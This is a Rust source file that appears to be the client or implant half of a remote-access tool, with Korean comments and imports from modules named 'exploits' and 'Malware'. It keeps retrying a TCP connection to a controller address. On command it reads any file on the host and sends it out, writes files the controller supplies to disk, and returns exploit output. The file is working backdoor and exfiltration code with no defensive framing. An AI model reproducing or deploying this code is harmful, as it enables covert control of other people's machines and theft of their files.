use crate::exploits::{Exploits, Malware};
use crate::structure::{
    Detector, Generator, StructRawStonePayload, StructStone, StructStoneHeader, StructStonePayload,
};
use bstr::ByteSlice;
use std::fs::File;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::{env, u8};

#[derive(Debug)]
pub struct Session {
    socket: TcpStream,
}

impl Session {
    pub fn new(ip_port: String) -> Session {
        let mut socket;

        if let Ok(s) = TcpStream::connect(ip_port.clone()) {
            socket = s;
            let packet = StructRawStonePayload::new("", "", "").to_stone();
            socket
                .write_all(&packet.stone)
                .expect("TODO: panic message");
            Session { socket }
        } else {
            Self::new(ip_port)
        }
    }
}

pub trait Client {
    fn send(&mut self, stone: Vec<u8>);
    fn send_msg(&mut self, msg: &str);
    fn disconnect(&mut self);
    fn recv(&mut self, buffer_size: usize) -> Vec<u8>;
    fn receiving(&mut self, buffer: StructStone) -> StructStone;
    fn download(&mut self, stone: StructStone) -> bool;
    fn upload(&mut self, stone: StructStone) -> bool;
    fn exploit(&mut self, exploit: Vec<u8>) -> bool;
}

impl Client for Session {
    fn send(&mut self, stone: Vec<u8>) {
        self.socket
            .write_all(stone.as_slice())
            .expect("Failed to send");
    }

    fn send_msg(&mut self, msg: &str) {
        self.send(StructStone::response(msg).stone);
    }

    fn disconnect(&mut self) {
        let packet = StructStone::disconnect();
        self.send(packet.stone);
        self.socket.try_clone().expect("Failed to close");
    }

    fn recv(&mut self, buffer_size: usize) -> Vec<u8> {
        let mut buffer: Vec<u8> = vec![0; buffer_size];

        match self.socket.read_exact(&mut buffer) {
            Ok(_) => buffer_size,
            Err(_) => buffer_size,
        };

        buffer
    }

    fn receiving(&mut self, buffer: StructStone) -> StructStone {
        // 함수가 재귀적으로 호출돠기 때문에 빈 헤더, 페이로드를 입력받음, 기본 헤더의 페이로드 크기는 12바이트 고정임
        let mut payload = StructStonePayload::default(); // 응답을 받을 빈 페이로드 구조체 생성
        let buffer_size = buffer.payload_size();

        if buffer_size != 12 {
            // 만약 수신받은 데이터의 크기가 12 바이트가 아니라면
            payload = StructStonePayload::from(self.recv(buffer_size)); // 페이로드 크기만큼 데이터를 받고 구조체로 변환하여 빈 페이로드 구조체에 저장
            return StructStone::from(buffer.header, payload); // 헤더와 페이로드를 결합하여 구조체로 반환
        }

        let header = StructStoneHeader::load(self.recv(12)); //만함수 인자로 입력받은 헤더의 페이로드 크기가 12바이트 (기본 헤더 ) 라면 새로운 헤더 (12바이트 고정)을 수신받고
        return self.receiving(StructStone::from(header, payload)); // 새로운 헤더를 재귀함수로 입력함 이 경우 재귀함수에서 if buffer.header.stone_size != vec![12,0,0,0] 문에 걸려서 페이로드를 수신받게 됨
    }

    fn download(&mut self, stone: StructStone) -> bool {
        let path = match String::from_utf8(stone.get_file()) {
            Ok(ok) => ok,
            Err(_) => {
                self.send_msg("File Not Found");
                return false;
            }
        };

        let mut open_file = match File::open(path.replace("\\", "/")) {
            Ok(file) => file,
            Err(_) => {
                self.send_msg("File Not Found");
                return false;
            }
        };
        let mut file = vec![];

        match open_file.read_to_end(&mut file) {
            Ok(ok) => ok.to_le_bytes().to_vec(),
            Err(_) => {
                self.send_msg("File Not Found");
                return false;
            }
        };

        self.send(StructStone::download(file).stone);

        true
    }
    fn upload(&mut self, stone: StructStone) -> bool {
        let file_arr: &[u8] = &stone.get_file()[..];
        let mut fields: Vec<&[u8]> = file_arr.split_str("<name_end>").collect();

        let path = format!(
            "{:?}/{:?}",
            env::current_dir().unwrap(),
            String::from_utf8(Vec::from(fields[0])).unwrap()
        )
        .replace('"', "")
        .replace("\\", "/");

        let mut open_file = match File::create(path.clone()) {
            Ok(ok) => ok,
            Err(_) => {
                self.send_msg("File Not Found");
                return false;
            }
        };

        let file = match open_file.write_all(&mut fields[1]) {
            Ok(_) => format!("File {:?} upload successful", path)
                .as_bytes()
                .to_vec(),
            Err(_) => {
                self.send_msg("File Not Found");
                return false;
            }
        };

        self.send(StructStone::upload(file).stone);

        true
    }

    fn exploit(&mut self, output: Vec<u8>) -> bool {
        self.send(StructStone::exploit(output).stone);
        true
    }
}
